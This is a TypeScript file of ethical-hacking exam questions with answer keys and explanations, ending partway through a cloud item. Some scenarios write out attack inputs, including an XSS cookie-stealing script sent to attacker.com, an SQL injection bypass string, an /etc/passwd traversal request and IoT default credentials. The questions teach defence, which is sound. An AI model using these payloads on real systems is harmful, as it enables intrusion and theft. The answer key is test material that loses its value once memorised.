import { Question } from '../types';

export const EHE_QUESTIONS: Question[] = [
  // ==========================================
  // MODULE 01: Information Security Fundamentals
  // ==========================================
  {
    id: 'ehe-01-001',
    moduleId: 'mod-01',
    moduleTitle: 'Module 01: Information Security Fundamentals',
    subTopic: 'Information Security Fundamentals (CIA Triad)',
    scenario: 'An attacker intercepted an email containing a financial wire transfer instruction and modified the recipient bank account number before forwarding it to the clearinghouse. The clearinghouse processed the modified transaction.',
    questionText: 'Which pillar of the CIA Triad was directly violated by this modification?',
    options: [
      'Confidentiality',
      'Integrity',
      'Availability',
      'Non-Repudiation'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Integrity ensures that data remains accurate, complete, and protected against unauthorized modification, tampering, or deletion in transit or storage. Modifying the recipient account number directly compromises data integrity.',
    keyTakeaway: 'Unauthorized modification = Integrity compromise. Unauthorized viewing = Confidentiality compromise. Denial of access = Availability compromise.',
    pageRef: 'Page 3-18'
  },
  {
    id: 'ehe-01-002',
    moduleId: 'mod-01',
    moduleTitle: 'Module 01: Information Security Fundamentals',
    subTopic: 'Information Security Fundamentals (Non-Repudiation)',
    scenario: 'A corporate employee signs a critical contract using their private cryptographic key. Later, the employee attempts to deny ever having reviewed or approved the document.',
    questionText: 'Which security service prevents the sender from successfully denying having sent or signed the communication?',
    options: [
      'Availability',
      'Non-Repudiation',
      'Authorization',
      'Steganography'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'Non-Repudiation guarantees that the sender of a message or signer of a document cannot later deny having sent or executed it. It is commonly implemented using digital signatures backed by Public Key Infrastructure (PKI).',
    keyTakeaway: 'Digital signatures provide proof of origin and non-repudiation.',
    pageRef: 'Page 18-35'
  },
  {
    id: 'ehe-01-003',
    moduleId: 'mod-01',
    moduleTitle: 'Module 01: Information Security Fundamentals',
    subTopic: 'Information Security Laws and Regulations',
    scenario: 'A major hospital network stores electronic Protected Health Information (ePHI) on its patient portal. A recent audit revealed that unencrypted medical history records were exposed on an unauthenticated endpoint.',
    questionText: 'Which federal regulatory compliance standard mandates strict safeguards to protect patient ePHI from unauthorized access and penalties for data breaches?',
    options: [
      'PCI-DSS',
      'HIPAA (Health Insurance Portability and Accountability Act)',
      'SOX (Sarbanes-Oxley Act)',
      'DMCA (Digital Millennium Copyright Act)'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'HIPAA governs the privacy and security of individuals\' Protected Health Information (PHI/ePHI). PCI-DSS governs credit cards, SOX focuses on corporate accounting and financial reporting transparency, and DMCA addresses digital copyright violations.',
    keyTakeaway: 'Healthcare data / ePHI = HIPAA; Credit card holder data = PCI-DSS; Corporate financial accounting = SOX.',
    pageRef: 'Page 39-41'
  },
  {
    id: 'ehe-01-004',
    moduleId: 'mod-01',
    moduleTitle: 'Module 01: Information Security Fundamentals',
    subTopic: 'Information Security Laws and Regulations',
    scenario: 'An e-commerce retailer processes millions of credit card transactions each year. To avoid hefty non-compliance fines and retain merchant processing rights, they must undergo an annual security audit validating their cardholder data environment (CDE).',
    questionText: 'Which standard establishes strict requirements for firewalls, encryption of transmission, tokenization, and physical access controls to cardholder data?',
    options: [
      'PCI-DSS (Payment Card Industry Data Security Standard)',
      'FISMA',
      'GDPR',
      'GLBA'
    ],
    correctAnswers: [0],
    difficulty: 'Fundamental',
    explanation: 'PCI-DSS is the proprietary information security standard for organizations that handle branded credit cards from major card schemes (Visa, MasterCard, Amex, Discover).',
    keyTakeaway: 'Cardholder Data Environment (CDE) protection is mandated by PCI-DSS.',
    pageRef: 'Page 41-50'
  },

  // ==========================================
  // MODULE 02: Ethical Hacking Fundamentals
  // ==========================================
  {
    id: 'ehe-02-001',
    moduleId: 'mod-02',
    moduleTitle: 'Module 02: Ethical Hacking Fundamentals',
    subTopic: 'Cyber Kill Chain Methodology',
    scenario: 'An Advanced Persistent Threat (APT) group couples a malicious remote access trojan (RAT) executable with a tailored PDF document exploiting a known Adobe Reader vulnerability.',
    questionText: 'According to the Lockheed Martin Cyber Kill Chain methodology, which phase describes pairing malware with an exploit into a deliverable payload?',
    options: [
      'Reconnaissance',
      'Weaponization',
      'Exploitation',
      'Command and Control (C2)'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Weaponization is the step where the adversary couples an exploit with a malicious payload (e.g., creating a malicious Office macro or Trojanized PDF) to generate a deliverable package prior to transmission.',
    keyTakeaway: '7 Kill Chain steps in order: Reconnaissance -> Weaponization -> Delivery -> Exploitation -> Installation -> Command & Control (C2) -> Actions on Objectives.',
    pageRef: 'Page 54-61'
  },
  {
    id: 'ehe-02-002',
    moduleId: 'mod-02',
    moduleTitle: 'Module 02: Ethical Hacking Fundamentals',
    subTopic: 'Hacking Concepts and Hacker Classes',
    scenario: 'An individual discovers a security vulnerability on a government website without prior authorization. They exploit the flaw, but instead of selling the data or demanding a ransom, they publicly disclose the vulnerability online to force the organization to fix it.',
    questionText: 'How is this individual classified in the standard taxonomy of hacker classes?',
    options: [
      'White Hat Hacker',
      'Grey Hat Hacker',
      'Black Hat Hacker',
      'Suicide Hacker'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Grey Hat Hackers operate without explicit prior authorization (making their entry technically illegal), but they do not possess purely malicious intent like Black Hats; they often disclose the findings publicly or demand a reward to fix it.',
    keyTakeaway: 'White Hat = Authorized & benevolent; Black Hat = Unauthorized & malicious; Grey Hat = Unauthorized but non-malicious / ambivalent.',
    pageRef: 'Page 61-69'
  },
  {
    id: 'ehe-02-003',
    moduleId: 'mod-02',
    moduleTitle: 'Module 02: Ethical Hacking Fundamentals',
    subTopic: 'Different Phases of Hacking Cycle',
    scenario: 'A penetration tester uses Nmap to discover open TCP ports, running services, and operating system banners on a client target network without exploiting any flaws.',
    questionText: 'Which phase of the ethical hacking cycle is the tester conducting?',
    options: [
      'Reconnaissance (Passive Footprinting)',
      'Scanning and Enumeration',
      'Gaining Access',
      'Maintaining Access'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'Scanning and Enumeration involves actively probing target IP addresses and networks to identify live hosts, open ports, running services, and OS versions before attempting exploitation.',
    keyTakeaway: 'Hacking cycle phases: Reconnaissance -> Scanning -> Gaining Access -> Maintaining Access -> Clearing Tracks.',
    pageRef: 'Page 69-78'
  },
  {
    id: 'ehe-02-004',
    moduleId: 'mod-02',
    moduleTitle: 'Module 02: Ethical Hacking Fundamentals',
    subTopic: 'Ethical Hacking Concepts, Scope, and Limitations',
    scenario: 'A security consultant is hired to perform an ethical hacking assessment. The client\'s IT manager asks the consultant to start testing immediately before executing a formal contract.',
    questionText: 'What is the most critical document that an ethical hacker must have signed before commencing any intrusive security testing?',
    options: [
      'Verbal approval from the helpdesk lead',
      'Signed Rules of Engagement (RoE) and Written Authorization (Get Out of Jail Free card)',
      'Proof of purchase for commercial penetration testing tools',
      'An SSL Certificate from a public Certificate Authority'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'An ethical hacker must always have written authorization and clearly defined Rules of Engagement (RoE) signed by authorized corporate stakeholders before running tests. Testing without written consent is illegal.',
    keyTakeaway: 'Never touch a target network without signed written authorization and scoped Rules of Engagement.',
    pageRef: 'Page 78-95'
  },

  // ==========================================
  // MODULE 03: Information Security Threats & Vulnerability Assessment
  // ==========================================
  {
    id: 'ehe-03-001',
    moduleId: 'mod-03',
    moduleTitle: 'Module 03: Information Security Threats and Vulnerability Assessment',
    subTopic: 'Malware and its Types',
    scenario: 'A finance employee receives a file named `invoice_q3.pdf.exe` disguised as an Acrobat document. When launched, the program displays a fake error message while silently installing a covert keylogger and opening a remote backdoor for the attacker.',
    questionText: 'What specific category of malware masquerades as benign software while concealing malicious functionality?',
    options: [
      'Macro Virus',
      'Trojan Horse',
      'Self-replicating Worm',
      'Logic Bomb'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'A Trojan Horse pretends to be legitimate or useful software (such as a utility, game, or document) while concealing hidden malicious payloads. Unlike worms and viruses, Trojans do not self-replicate.',
    keyTakeaway: 'Trojans mislead users of true intent and do NOT self-replicate; Worms spread independently across networks without user execution.',
    pageRef: 'Page 334-347'
  },
  {
    id: 'ehe-03-002',
    moduleId: 'mod-03',
    moduleTitle: 'Module 03: Information Security Threats and Vulnerability Assessment',
    subTopic: 'Malware and its Types',
    scenario: 'A network anomaly causes enterprise internal bandwidth to saturate within minutes. Systems become unresponsive, and security engineers determine that a malicious program is scanning subnet IP ranges and replicating itself automatically across vulnerable SMB services without human interaction.',
    questionText: 'Which malware classification best describes this self-propagating threat?',
    options: [
      'Worm',
      'Spyware',
      'Adware',
      'Ransomware'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'Worms are standalone, self-replicating malicious programs that spread autonomously across networks by exploiting vulnerabilities, consuming vast system and network bandwidth without requiring a host file or user interaction.',
    keyTakeaway: 'Worm = Autonomous network self-replication; Virus = Requires human execution and a host file.',
    pageRef: 'Page 334-347'
  },
  {
    id: 'ehe-03-003',
    moduleId: 'mod-03',
    moduleTitle: 'Module 03: Information Security Threats and Vulnerability Assessment',
    subTopic: 'Vulnerabilities & Scoring',
    scenario: 'A vulnerability scan generates a report flagging a flaw with a CVSS v3 Base Score of 9.8.',
    questionText: 'According to the Common Vulnerability Scoring System (CVSS) v3 rating scale, how is this vulnerability severity categorized?',
    options: [
      'Medium',
      'High',
      'Critical',
      'Low'
    ],
    correctAnswers: [2],
    difficulty: 'Fundamental',
    explanation: 'In CVSS v3: Low is 0.1 - 3.9; Medium is 4.0 - 6.9; High is 7.0 - 8.9; Critical is 9.0 - 10.0. A score of 9.8 is classified as Critical.',
    keyTakeaway: 'CVSS v3 Severities: 0.0 None, 0.1-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical.',
    pageRef: 'Page 360-367'
  },

  // ==========================================
  // MODULE 04: Password Cracking Techniques and Countermeasures
  // ==========================================
  {
    id: 'ehe-04-001',
    moduleId: 'mod-04',
    moduleTitle: 'Module 04: Password Cracking Techniques and Countermeasures',
    subTopic: 'Password Cracking Techniques',
    scenario: 'An attacker extracts a database table containing unsalted NTLM password hashes. Using pre-computed lookup tables containing millions of plaintext passwords and their corresponding cryptographic hashes, the attacker recovers complex 8-character passwords within 3 seconds.',
    questionText: 'What password cracking technique utilizes pre-computed hash lookup tables to trade storage space for computational speed?',
    options: [
      'Dictionary Attack',
      'Rainbow Table Attack',
      'Brute-Force Attack',
      'Shoulder Surfing'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'A Rainbow Table is a pre-computed table of hash values and plaintext reductions used to reverse cryptographic hash functions rapidly. It trades vast storage memory for near-instant lookup speed.',
    keyTakeaway: 'Rainbow tables use pre-computed hashes. Cryptographic Salting renders rainbow tables completely ineffective.',
    pageRef: 'Page 263-275'
  },
  {
    id: 'ehe-04-002',
    moduleId: 'mod-04',
    moduleTitle: 'Module 04: Password Cracking Techniques and Countermeasures',
    subTopic: 'Password Cracking Countermeasures',
    scenario: 'A developer is designing a user registration system and wants to ensure that two users choosing the exact same password (`Password123!`) will result in completely different stored hash values in the database, defeating pre-computed rainbow table attacks.',
    questionText: 'What cryptographic defense mechanism should the developer append to passwords before hashing?',
    options: [
      'Digital Certificate',
      'Cryptographic Salt',
      'Symmetric session key',
      'MD5 checksum'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'A cryptographic salt is a unique, random string of bits generated for each user and concatenated with the plaintext password prior to hashing. It ensures that identical passwords yield distinct hashes and neutralizes rainbow table attacks.',
    keyTakeaway: 'Salt = Unique random value per password that defeats rainbow table attacks.',
    pageRef: 'Page 314-331'
  },
  {
    id: 'ehe-04-003',
    moduleId: 'mod-04',
    moduleTitle: 'Module 04: Password Cracking Techniques and Countermeasures',
    subTopic: 'Password Cracking Tools',
    scenario: 'A security engineer is performing an offline audit of recovered `/etc/shadow` password hashes on a Linux server using a widely recognized open-source tool that automatically detects hash types and supports multiple attack modes.',
    questionText: 'Which popular tool is standard for offline password auditing and hash cracking?',
    options: [
      'John the Ripper',
      'Wireshark',
      'Snort',
      'Nikto'
    ],
    correctAnswers: [0],
    difficulty: 'Fundamental',
    explanation: 'John the Ripper and Hashcat are industry-standard password security auditing and password recovery tools. Wireshark is a packet analyzer, Snort is an IDS/IPS, and Nikto is a web server scanner.',
    keyTakeaway: 'Password cracking tools: John the Ripper, Hashcat, Ophcrack.',
    pageRef: 'Page 303-314'
  },

  // ==========================================
  // MODULE 05: Social Engineering Techniques and Countermeasures
  // ==========================================
  {
    id: 'ehe-05-001',
    moduleId: 'mod-05',
    moduleTitle: 'Module 05: Social Engineering Techniques and Countermeasures',
    subTopic: 'Social Engineering Techniques',
    scenario: 'An attacker leaves several USB thumb drives labeled "Executive Compensation & Q4 Bonuses Confidential" scattered across the employee cafeteria and corporate parking lot. A curious HR specialist inserts one into a company workstation, triggering malware installation.',
    questionText: 'Which social engineering technique exploits human curiosity or greed by offering a tangible item infected with malicious software?',
    options: [
      'Pretexting',
      'Baiting',
      'Quid Pro Quo',
      'Spear Phishing'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Baiting involves leaving physical media (like infected USB drives or optical media) in locations where victims will find them, relying on curiosity or greed to entice the victim into plugging it in.',
    keyTakeaway: 'Infected physical media left in public = Baiting; Offering a bogus IT service/favor = Quid Pro Quo; Fake scenario/identity = Pretexting.',
    pageRef: 'Page 229-252'
  },
  {
    id: 'ehe-05-002',
    moduleId: 'mod-05',
    moduleTitle: 'Module 05: Social Engineering Techniques and Countermeasures',
    subTopic: 'Social Engineering Techniques',
    scenario: 'An attacker calls the accounting department pretending to be an external IT technician assisting with a critical software migration. The caller tricks the junior accountant into providing active credentials over the phone.',
    questionText: 'What term describes phone-based social engineering?',
    options: [
      'Smishing',
      'Vishing (Voice Phishing)',
      'Watering Hole Attack',
      'Pharming'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'Vishing (Voice Phishing) is the practice of conducting social engineering attacks via telephone calls to elicit sensitive information or credentials. Smishing uses SMS text messages.',
    keyTakeaway: 'Vishing = Voice/Phone phishing; Smishing = SMS/Text phishing; Spear phishing = Targeted email phishing.',
    pageRef: 'Page 229-252'
  },
  {
    id: 'ehe-05-003',
    moduleId: 'mod-05',
    moduleTitle: 'Module 05: Social Engineering Techniques and Countermeasures',
    subTopic: 'Physical Social Engineering Tactics',
    scenario: 'An unauthorized individual wearing delivery overalls carries a heavy stack of cardboard boxes and waits near a secure access-controlled badge door. An authorized employee enters and politely holds the door open, allowing the attacker inside without badging in.',
    questionText: 'What physical security exploitation technique occurred?',
    options: [
      'Tailgating (Piggybacking)',
      'Shoulder Surfing',
      'Dumpster Diving',
      'Eavesdropping'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'Tailgating (also known as Piggybacking) occurs when an unauthorized person closely follows an authorized individual through an access-controlled portal without presenting valid credentials, often exploiting human courtesy.',
    keyTakeaway: 'Following an authorized person through a secure door = Tailgating/Piggybacking. Countermeasure: Mantrap / Turnstile.',
    pageRef: 'Page 252-257'
  },

  // ==========================================
  // MODULE 06: Network Level Attacks and Countermeasures
  // ==========================================
  {
    id: 'ehe-06-001',
    moduleId: 'mod-06',
    moduleTitle: 'Module 06: Network Level Attacks and Countermeasures',
    subTopic: 'Sniffing Techniques',
    scenario: 'An attacker on a switched local area network sends unsolicited ARP replies to the default gateway and target workstation, binding the attacker\'s MAC address to the IP address of the gateway. As a result, all outbound internet traffic from the workstation is routed through the attacker\'s machine.',
    questionText: 'What Layer 2 attack technique is being executed?',
    options: [
      'MAC Flooding',
      'ARP Poisoning (ARP Spoofing)',
      'DHCP Starvation',
      'DNS Amplification'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'ARP Poisoning (ARP Spoofing) corrupts the ARP cache of target systems by broadcasting spoofed ARP replies associating the attacker\'s MAC address with a legitimate IP (like the default gateway), facilitating Man-in-the-Middle (MITM) sniffing.',
    keyTakeaway: 'ARP Poisoning maps attacker MAC to legitimate IP. Countermeasure: Dynamic ARP Inspection (DAI) and static ARP entries.',
    pageRef: 'Page 103-185'
  },
  {
    id: 'ehe-06-002',
    moduleId: 'mod-06',
    moduleTitle: 'Module 06: Network Level Attacks and Countermeasures',
    subTopic: 'Sniffing Countermeasures',
    scenario: 'An attacker uses a tool like `macof` to flood a network switch with thousands of bogus MAC addresses within seconds. Once the switch\'s Content Addressable Memory (CAM) table is exhausted, the switch begins broadcasting incoming packets to every port, turning it into a hub.',
    questionText: 'Which switch security feature prevents MAC Flooding by restricting the number of valid MAC addresses allowed on a single switch port?',
    options: [
      'Port Security',
      'Spanning Tree Protocol (STP)',
      'Access Control List (ACL)',
      'Network Address Translation (NAT)'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'Port Security limits the number of MAC addresses learned on a physical switch port and shuts down or drops frames if unknown or excessive MAC addresses are detected, neutralizing MAC Flooding attacks.',
    keyTakeaway: 'MAC Flooding overflows the switch CAM table. Solution: Port Security (sticky MAC / max MAC limit).',
    pageRef: 'Page 185-196'
  },
  {
    id: 'ehe-06-003',
    moduleId: 'mod-06',
    moduleTitle: 'Module 06: Network Level Attacks and Countermeasures',
    subTopic: 'Denial-of-Service (DoS/DDoS)',
    scenario: 'A target web server becomes completely unresponsive. Packet captures show thousands of TCP SYN packets arriving with spoofed IP addresses. The server responds with SYN-ACK and waits for the final ACK that never arrives, exhausting its connection backlog table.',
    questionText: 'What specific type of Denial-of-Service attack is occurring?',
    options: [
      'SYN Flood Attack',
      'Smurf Attack',
      'Ping of Death',
      'Teardrop Attack'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'In a SYN Flood attack, the attacker exploits the 3-way TCP handshake by sending numerous SYN requests with spoofed IPs. The server maintains half-open connections in its memory pool until all connection slots are depleted.',
    keyTakeaway: 'Half-open TCP connections exhausting backlog = SYN Flood. Defense: SYN Cookies and rate limiting.',
    pageRef: 'Page 368-391'
  },
  {
    id: 'ehe-06-004',
    moduleId: 'mod-06',
    moduleTitle: 'Module 06: Network Level Attacks and Countermeasures',
    subTopic: 'Session Hijacking Attacks',
    scenario: 'An attacker intercepts an active unencrypted TCP conversation between a client and a web application. By calculating the expected 32-bit TCP Sequence Number, the attacker injects malicious commands into the stream while desynchronizing the legitimate client.',
    questionText: 'What attack is taking place?',
    options: [
      'TCP Session Hijacking',
      'Cross-Site Scripting',
      'SQL Injection',
      'Buffer Overflow'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'TCP Session Hijacking involves predicting or intercepting the TCP sequence numbers of an established session, allowing the attacker to spoof packets and take control of the authenticated communication channel.',
    keyTakeaway: 'Predicting sequence numbers on an established stream = TCP Session Hijacking. Defense: End-to-end encryption (TLS/IPsec).',
    pageRef: 'Page 395-411'
  },

  // ==========================================
  // MODULE 07: Web Application Attacks and Countermeasures
  // ==========================================
  {
    id: 'ehe-07-001',
    moduleId: 'mod-07',
    moduleTitle: 'Module 07: Web Application Attacks and Countermeasures',
    subTopic: 'SQL Injection Attacks',
    scenario: 'During a security assessment of a web portal login form, a tester submits the following payload in the username field:\nadmin\' OR \'1\'=\'1\' -- \nThe application logs the tester into the administrator dashboard without asking for a password.',
    questionText: 'What fundamental development defect allowed this authentication bypass to succeed?',
    options: [
      'Absence of HTTPS TLS encryption',
      'Direct concatenation of untrusted user input into an SQL query string without parameterization',
      'Failure to implement a CAPTCHA challenge',
      'Inadequate password length requirement'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    codeSnippet: 'SELECT * FROM users WHERE username = \'admin\' OR \'1\'=\'1\' --\' AND password = \'...\';',
    explanation: 'SQL Injection occurs when user input is concatenated directly into SQL command strings instead of using parameterized queries (Prepared Statements). The `OR \'1\'=\'1\'` condition evaluates to true, bypassing credentials.',
    keyTakeaway: 'The primary countermeasure for SQL Injection is Parameterized Queries (Prepared Statements).',
    pageRef: 'Page 680-719'
  },
  {
    id: 'ehe-07-002',
    moduleId: 'mod-07',
    moduleTitle: 'Module 07: Web Application Attacks and Countermeasures',
    subTopic: 'Web Application Threats (XSS)',
    scenario: 'An attacker inputs `<script>document.location="http://attacker.com/steal?c="+document.cookie</script>` into a public discussion forum comment box. Every user who later visits and views that thread has their session cookie silently transmitted to the attacker\'s server.',
    questionText: 'Which variation of Cross-Site Scripting (XSS) is demonstrated in this scenario?',
    options: [
      'Reflected XSS',
      'Stored (Persistent) XSS',
      'DOM-based XSS',
      'Self-XSS'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Stored (Persistent) XSS occurs when malicious JavaScript is permanently saved into the target application\'s database (e.g., via forum posts, comments, or profile bios) and executed automatically in the browser of any user who loads that page.',
    keyTakeaway: 'Stored XSS is saved in the database; Reflected XSS requires the victim to click a crafted link; DOM XSS executes purely in client-side scripts.',
    pageRef: 'Page 621-660'
  },
  {
    id: 'ehe-07-003',
    moduleId: 'mod-07',
    moduleTitle: 'Module 07: Web Application Attacks and Countermeasures',
    subTopic: 'Web Server Attacks',
    scenario: 'A web application accepts a document filename parameter in the URL: `https://example.com/view?file=report.pdf`. An attacker changes the URL to `https://example.com/view?file=../../../../etc/passwd` and successfully views system credentials.',
    questionText: 'What vulnerability and attack vector is represented here?',
    options: [
      'Directory Traversal (Path Traversal / Dot-Dot-Slash)',
      'Cross-Site Request Forgery (CSRF)',
      'Server-Side Request Forgery (SSRF)',
      'XML External Entity (XXE)'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    codeSnippet: 'GET /view?file=../../../../etc/passwd HTTP/1.1',
    explanation: 'Directory Traversal (or Path Traversal) uses dot-dot-slash (`../`) sequences to navigate out of the web document root directory and access unauthorized files elsewhere on the server file system.',
    keyTakeaway: '`../` sequences used to escape web root = Directory / Path Traversal.',
    pageRef: 'Page 600-619'
  },

  // ==========================================
  // MODULE 08: Wireless Attacks and Countermeasures
  // ==========================================
  {
    id: 'ehe-08-001',
    moduleId: 'mod-08',
    moduleTitle: 'Module 08: Wireless Attacks and Countermeasures',
    subTopic: 'Wireless Network-Specific Attack Techniques',
    scenario: 'An attacker sets up a rogue Wi-Fi access point in an airport lounge broadcasting the identical SSID ("Airport_Free_WiFi") and MAC address as the legitimate airport network, but with a stronger transmission signal to lure travelers into connecting.',
    questionText: 'What specific type of wireless rogue attack is this called?',
    options: [
      'Evil Twin Attack',
      'War Driving',
      'WPS Reaver Attack',
      'Bluejacking'
    ],
    correctAnswers: [0],
    difficulty: 'Scenario',
    explanation: 'An Evil Twin is a rogue wireless access point that impersonates a legitimate network by broadcasting the identical SSID (and often cloned MAC), tricking client devices into automatically associating with it so the attacker can sniff credentials.',
    keyTakeaway: 'Rogue AP cloning a legitimate SSID = Evil Twin.',
    pageRef: 'Page 423-456'
  },
  {
    id: 'ehe-08-002',
    moduleId: 'mod-08',
    moduleTitle: 'Module 08: Wireless Attacks and Countermeasures',
    subTopic: 'Wireless Network-Specific Attack Techniques',
    scenario: 'To capture the WPA2 4-Way Handshake from a connected wireless client for offline dictionary cracking, an attacker transmits forged 802.11 management frames to disconnect the victim from the access point.',
    questionText: 'Which 802.11 frame type is used by the attacker to force client disconnection and subsequent re-association?',
    options: [
      'Beacon Frame',
      'Probe Request Frame',
      'Deauthentication Frame',
      'RTS/CTS Frame'
    ],
    correctAnswers: [2],
    difficulty: 'Intermediate',
    explanation: 'Attackers transmit forged Deauthentication (Deauth) frames to force clients to disconnect from the AP. When the client automatically reconnects, the attacker captures the 4-way EAPOL handshake to crack the pre-shared key (PSK) offline.',
    keyTakeaway: 'Deauthentication frame attacks force client re-authentication to capture the WPA2 4-way handshake.',
    pageRef: 'Page 423-456'
  },
  {
    id: 'ehe-08-003',
    moduleId: 'mod-08',
    moduleTitle: 'Module 08: Wireless Attacks and Countermeasures',
    subTopic: 'Bluetooth Attacks',
    scenario: 'An executive sitting on a commuter train receives an unexpected Bluetooth pairing request that exploits an OBEX protocol flaw. Without the executive approving the prompt, the attacker silently steals contact lists, SMS messages, and call history from the executive\'s smartphone.',
    questionText: 'What term differentiates the unauthorized theft of data via Bluetooth from merely sending spam messages?',
    options: [
      'Bluejacking',
      'Bluesnarfing',
      'Bluebugging',
      'War-chalking'
    ],
    correctAnswers: [1],
    difficulty: 'Intermediate',
    explanation: 'Bluesnarfing is the unauthorized access and theft of data (contacts, calendar, messages) from a Bluetooth-enabled device. Bluejacking is merely sending unsolicited messages or electronic business cards. Bluebugging creates a backdoor for remote control.',
    keyTakeaway: 'Bluejacking = Unsolicited messages; Bluesnarfing = Data theft; Bluebugging = Full remote control.',
    pageRef: 'Page 456-461'
  },

  // ==========================================
  // MODULE 09: Mobile Attacks and Countermeasures
  // ==========================================
  {
    id: 'ehe-09-001',
    moduleId: 'mod-09',
    moduleTitle: 'Module 09: Mobile Attacks and Countermeasures',
    subTopic: 'Mobile Device Management (MDM) Concept',
    scenario: 'An enterprise allows employees to access corporate email and proprietary databases using their personal smartphones under a Bring Your Own Device (BYOD) policy. A sales manager loses their phone while traveling abroad.',
    questionText: 'Which MDM feature allows IT administrators to selectively erase corporate confidential data from the device without deleting the employee\'s personal photos and private files?',
    options: [
      'Full Factory Reset',
      'Selective / Enterprise Remote Wipe',
      'SIM Card Locking',
      'Rootkit Injection'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Enterprise / Selective Remote Wipe removes only managed corporate applications, profiles, and encrypted container data from the device, preserving the user\'s personal files and photos on a BYOD device.',
    keyTakeaway: 'Containerization + Selective Remote Wipe protects enterprise assets on BYOD without destroying personal user data.',
    pageRef: 'Page 503-514'
  },
  {
    id: 'ehe-09-002',
    moduleId: 'mod-09',
    moduleTitle: 'Module 09: Mobile Attacks and Countermeasures',
    subTopic: 'Mobile Platform Attack Vectors',
    scenario: 'An Android user installs an application downloaded from an untrusted third-party forum by bypassing Google Play Store verification and enabling "Install from Unknown Sources".',
    questionText: 'What term describes installing applications on a mobile device outside the official vendor marketplace?',
    options: [
      'Sandboxing',
      'Sideloading',
      'Code Signing',
      'Containerization'
    ],
    correctAnswers: [1],
    difficulty: 'Fundamental',
    explanation: 'Sideloading is the process of installing applications on a mobile device from sources other than official platform app stores (such as Google Play or Apple App Store), significantly increasing the risk of malware infection.',
    keyTakeaway: 'Installing apps from third-party / non-official sources = Sideloading.',
    pageRef: 'Page 475-503'
  },

  // ==========================================
  // MODULE 10: IoT and OT Attacks and Countermeasures
  // ==========================================
  {
    id: 'ehe-10-001',
    moduleId: 'mod-10',
    moduleTitle: 'Module 10: IoT and OT Attacks and Countermeasures',
    subTopic: 'IoT Threats and Attacks',
    scenario: 'In a famous cyberattack, hundreds of thousands of internet-connected IP cameras, DVRs, and residential routers were infected by a botnet that scanned public IPv4 addresses on ports 23 (Telnet) and 2323 using a hardcoded dictionary of 62 default manufacturer usernames and passwords.',
    questionText: 'Which infamous IoT botnet was responsible for launching record-breaking DDoS attacks using default credentials?',
    options: [
      'Stuxnet',
      'Mirai',
      'WannaCry',
      'Conficker'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'The Mirai botnet scanned the internet for IoT devices protected only by factory default credentials (like `root:xc3511` or `admin:admin`), infected them, and enslaved them into massive DDoS botnet clusters.',
    keyTakeaway: 'Mirai botnet enslaved IoT devices via default Telnet credentials.',
    pageRef: 'Page 545-558'
  },
  {
    id: 'ehe-10-002',
    moduleId: 'mod-10',
    moduleTitle: 'Module 10: IoT and OT Attacks and Countermeasures',
    subTopic: 'OT Concepts and Threats',
    scenario: 'A municipal water treatment facility utilizes Supervisory Control and Data Acquisition (SCADA) systems and Programmable Logic Controllers (PLCs) to regulate water chemical dosing and pump speeds.',
    questionText: 'Why are traditional industrial Operational Technology (OT) protocols like Modbus, DNP3, and Profibus particularly vulnerable to cyber attacks when connected to corporate networks?',
    options: [
      'They enforce overly restrictive 4096-bit RSA keys that cause latency',
      'They were originally engineered without native encryption, authentication, or integrity checks',
      'They operate exclusively over high-frequency satellite links',
      'They require daily manual firmware reinstalls'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'Legacy industrial OT protocols (Modbus, DNP3, Profibus) were designed decades ago for isolated physical environments with safety and uptime as priorities. They lack inherent authentication, authorization, or encryption, meaning commands can be easily spoofed if network access is attained.',
    keyTakeaway: 'Legacy OT protocols lack native encryption and authentication. Strict network segmentation and the Purdue Model are required.',
    pageRef: 'Page 725-755'
  },

  // ==========================================
  // MODULE 11: Cloud Computing Threats and Countermeasures
  // ==========================================
  {
    id: 'ehe-11-001',
    moduleId: 'mod-11',
    moduleTitle: 'Module 11: Cloud Computing Threats and Countermeasures',
    subTopic: 'Cloud Concepts & Shared Responsibility Model',
    scenario: 'A company hosts a database on an Infrastructure as a Service (IaaS) virtual machine in the public cloud. An unpatched operating system vulnerability allows an attacker to compromise the VM.',
    questionText: 'Under the Cloud Shared Responsibility Model for IaaS, who is legally and operationally responsible for applying operating system security patches to the virtual machine?',
    options: [
      'The Cloud Service Provider (CSP) only',
      'The Cloud Customer (Tenant)',
      'The local Internet Service Provider (ISP)',
      'The hardware manufacturer'
    ],
    correctAnswers: [1],
    difficulty: 'Scenario',
    explanation: 'In the IaaS model, the Cloud Service Provider is responsible for security OF the cloud (physical data centers, hypervisors, server hardware), while the customer is responsible for security IN the cloud (guest OS patches, applications, data, and firewall rules).',
    keyTakeaway: 'IaaS: CSP manages physical hardware/hypervisor; Customer manages OS, runtime, and application layers.',
    pageRef: 'Page 851-862'
  },
  {
    id: 'ehe-11-002',
    moduleId: 'mod-11',
